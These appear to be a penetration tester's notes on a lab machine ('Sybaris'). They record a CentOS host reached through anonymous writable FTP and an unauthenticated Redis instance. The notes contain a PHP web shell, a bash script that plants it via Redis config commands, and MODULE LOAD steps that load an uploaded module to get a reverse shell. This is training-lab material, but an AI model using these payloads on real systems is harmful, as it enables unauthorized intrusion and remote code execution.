# Sybaris Notes

## Data 

IP:  192.168.231.93
OS: CentOS
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Sybaris-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 
- Wpscan there is a Wordpress theme possible rabbit hole

- Find a directory 

#### Timeline of tasks complete

nmapftpanon.png
ftpwritablepubdir.png
- /pub is not under /var/www/html
robotsandredis.png
composerjson.png
redisisvuln.png
gobuster301s.png
phppathtrav.png
redisRCEsh.png
mehhtlmy.png

- [Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)](https://www.exploit-db.com/exploits/47195)
- [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  from [[Reddish-Helped-Through]]
```bash
# 0xDF 
# cmd.php:




 <? system($_REQUEST['cmd']); ?>




# redishRCE.sh
#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 192.168.231.93 flushall
cat cmd.php | redis-cli -h 192.168.231.93 -x set subscribetoippsecandread0xdf
redis-cli -h 192.168.231.93 config set dir /tmp
redis-cli -h 192.168.231.93 config set dbfilename "cmd.php"
redis-cli -h 192.168.231.93 save
```
- https://www.exploit-db.com/exploits/1244
- Find the directory - probably redis is running as a redis user  
	- /tmp works!
- https://nvd.nist.gov/vuln/detail/CVE-2020-23766 - An arbitrary file deletion vulnerability was discovered on htmly v2.7.5 which allows remote attackers to use any absolute path to delete any file in the server should they gain Administrator privileges.
- htmly - [[metatag-cms-http___192.168.237.93_]]

```
cd redis-rce
python3 -m venv .venv;
source .venv/bin/activate;
pip3 install -r requirements.txt;
python3 redis-rce.py
```

tryingwithtmetasploitexpsofile.png

Then with https://github.com/n0b0dyCN/RedisModules-ExecuteCommand and failed

add `#include <string.h>` and it still timed out..

- no udp ports

Write up a hoy because the time constraints must be harsh
```
make -C ./src
```
wu-ftpuploadmoduleso.png

Instead of telnet I went with `redis-cli`
wu-loadmodule.png

`LOAD MODULE` 
```bash
redis-cli -h $ip
MODULE LOAD /path/to/module/module.so
```

wu-revshell.png


Now to privesc myself
